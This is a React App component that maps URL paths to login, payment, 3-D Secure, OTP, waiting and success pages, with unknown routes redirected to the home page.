import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';

// Pages
import LoginForm from './pages/LoginForm';
import LifestyleDemo from './pages/LifestyleDemo';
import Payment from './pages/Payment';
import Wait from './pages/Wait';
import Payment3D from './pages/3DPayment';
import PaymentOTP from './pages/PaymentOTP';
import Success from './pages/Success';

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />
        
        {/* Protected routes */}
        <Route path="/login" element={<LoginForm />} />
        <Route path="/payment" element={<Payment />} />
        <Route path="/wait" element={<Wait />} />
        <Route path="/3d-payment" element={<Payment3D />} />
        <Route path="/payment-otp" element={<PaymentOTP />} />
        <Route path="/success" element={<Success />} />
        
    
     
       
  
        
        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;


